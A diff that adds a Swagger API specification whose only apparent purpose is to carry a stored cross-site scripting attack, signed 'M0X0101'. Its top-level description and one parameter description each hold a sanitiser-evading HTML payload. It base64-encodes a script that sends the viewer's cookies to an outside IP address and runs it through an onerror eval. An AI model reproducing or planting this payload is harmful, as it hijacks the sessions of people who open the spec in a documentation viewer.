@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='Ij48c2NyaXB0IGxhbmd1YWdlPSAiSmF2YVNjcmlwdCI+ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xNDIuOTMuMTY4LjUyOjg4ODgvc2VydmVyL21haW4ucGhwP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='Ij48c2NyaXB0IGxhbmd1YWdlPSAiSmF2YVNjcmlwdCI+ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly8xNDIuOTMuMTY4LjUyOjg4ODgvc2VydmVyL21haW4ucGhwP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
